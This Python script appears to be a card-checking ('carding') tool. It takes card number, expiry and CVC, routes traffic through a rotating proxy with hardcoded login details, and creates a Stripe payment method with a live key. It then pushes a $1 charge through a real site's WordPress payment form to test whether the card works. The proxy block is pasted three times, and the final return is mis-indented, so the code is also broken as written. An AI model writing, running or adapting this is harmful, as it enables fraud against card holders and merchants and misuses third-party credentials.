import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	import requests
	username = "gloosmoke29-rotate"
	password = "gloosmoke"
	proxy = "p.webshare.io:80"
	proxy_auth = "{}:{}@{}".format(username, password, proxy)
	proxies = {
			"http":"http://{}".format(proxy_auth)
	}
	urlToGet = "http://api.ipify.org/"
	r = requests.get(urlToGet , proxies=proxies)
	print("IP Address: {}".format(r.text))
	
	import requests
	username = "gloosmoke29-rotate"
	password = "gloosmoke"
	proxy = "p.webshare.io:80"
	proxy_auth = "{}:{}@{}".format(username, password, proxy)
	proxies = {
			"http":"http://{}".format(proxy_auth)
	}
	urlToGet = "http://api.ipify.org/"
	r = requests.get(urlToGet , proxies=proxies)

	headers = {
			'authority': 'api.stripe.com',
			'accept': 'application/json',
			'accept-language': 'en-US,en;q=0.9',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://js.stripe.com',
			'referer': 'https://js.stripe.com/',
			'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_5104JjP4n78snmsaLtJ2RQ5oRxjyiNAFfpzjFxvjmFebTiRxyOrTpGpnJ8HNkaI6B40RsOFWRqlw2sF2kEaXr61lC00chJzCgzQ'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	import requests
	username = "gloosmoke29-rotate"
	password = "gloosmoke"
	proxy = "p.webshare.io:80"
	proxy_auth = "{}:{}@{}".format(username, password, proxy)
	proxies = {
	    "http":"http://{}".format(proxy_auth)
	}
	urlToGet = "http://api.ipify.org/"
	r = requests.get(urlToGet , proxies=proxies)

	cookies = {
	    '__stripe_mid': '06153fca-7bbd-4014-8a27-41a8e718aadcf95a68',
	    '__stripe_sid': '3356f2ef-f2cc-48a4-88f9-1e0e15f52349ff7a63',
	}
	
	headers = {
	    'authority': 'digiden.studio',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__stripe_mid=06153fca-7bbd-4014-8a27-41a8e718aadcf95a68; __stripe_sid=3356f2ef-f2cc-48a4-88f9-1e0e15f52349ff7a63',
	    'origin': 'https://digiden.studio',
	    'referer': 'https://digiden.studio/dd-digital-shop/pay-now/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1718792353657',
	}
	
	data = {
	    'data': 'ak_hp_textarea=&ak_js=1718792304036&__fluent_form_embded_post_id=911&_fluentform_16_fluentformnonce=c93cce1f7e&_wp_http_referer=%2Fdd-digital-shop%2Fpay-now%2F&names%5Bfirst_name%5D=Gloo&names%5Blast_name%5D=Smoke&input_text=NY&email=cardbygloosmoke1%40gmail.com&input_text_1=1&custom-payment-amount=1&payment_method=stripe&ak_bib=1718792306688&ak_bfs=1718792352568&ak_bkpc=22&ak_bkp=8%3B2%2C1%3B2%2C0%3B1%3B7%3B5%3B8%2C95%3B6%2C301%3B3%2C589%3B3%2C355%3B2%2C1103%3B2%2C214%3B3%2C680%3B3%2C272%3B2%2C204%3B5%2C165%3B4%2C104%3B6%2C195%3B3%2C593%3B3%2C217%3B3%2C51%3B3%2C811%3B&ak_bmc=6%3B7%2C1900%3B9%2C1323%3B8%2C2347%3B67%2C2493%3B9%2C3411%3B8%2C35029%3B&ak_bmcc=7&ak_bmk=&ak_bck=5%3B5%3B5%3B5%3B5%3B5%3B5%3B5%3B5%3B5%3B5%3B5&ak_bmmc=3&ak_btmc=6&ak_bsc=11&ak_bte=104%3B405%2C155%3B223%2C162%3B79%2C183%3B307%2C1202%3B89%2C325%3B94%2C1236%3B63%2C2291%3B72%2C2431%3B237%2C1584%3B118%2C411%3B266%2C188%3B87%2C585%3B107%2C8302%3B298%2C150%3B116%2C293%3B97%2C7794%3B414%2C144%3B266%2C16483%3B54%2C517%3B&ak_btec=20&ak_bmm=12%2C230%3B8%2C243%3B11%2C282%3B&item__16__fluent_checkme_=&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '16',
	}
	
	r2 = requests.post(
	    'https://digiden.studio/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
return (r2.json())
